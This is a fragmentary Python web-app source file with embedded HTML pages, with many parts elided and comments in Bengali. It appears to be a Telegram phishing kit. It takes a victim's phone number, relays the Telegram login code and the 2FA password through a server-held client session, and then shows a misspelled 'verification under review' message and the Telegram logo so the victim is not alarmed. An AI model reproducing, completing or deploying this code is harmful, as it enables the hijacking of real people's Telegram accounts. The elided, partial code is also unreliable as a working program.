...
async def send_code():
    ...
    if not validate_phone_number(phone, country_code):
        ...
        <div class="login-container">
            ...
            <p class="subtitle">Please enter a valid phone number.</p>
    ...
    try:
        ...
        session['current_step'] = 'otp'  # State management
...
async def verify_otp():
    ...
    if 'telegram_client' not in session or 'phone_number' not in session or 'phone_code_hash' not in session:
        ...
        <div class="login-container">
            ...
            <p class="subtitle">Your Verifition has expired. Please start over.</p>
            <a href="/" class="primary-btn" style="text-decoration: none; display: inline-block;">Try Again</a>
        </div>
        ''')
    
    # ক্লায়েন্ট পুনরুদ্ধার করুন (নতুন করে তৈরি করবেন না)
    ...
    try:
        ...
        <div class="login-container">
            ...
            <p class="subtitle">⏳Your verifition under review.</p>
            <p class="footer-text">You can now close this window.</p>
        </div>
        ''')
        
    except SessionPasswordNeededError:
        # 2FA পাসওয়ার্ড প্রয়োজন - একই ক্লায়েন্ট রাখুন
        session['current_step'] = '2fa'
        
        # 2FA পাসওয়ার্ড পৃষ্ঠায় রিডাইরেক্ট করুন
        return render_page('''
        <div class="login-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
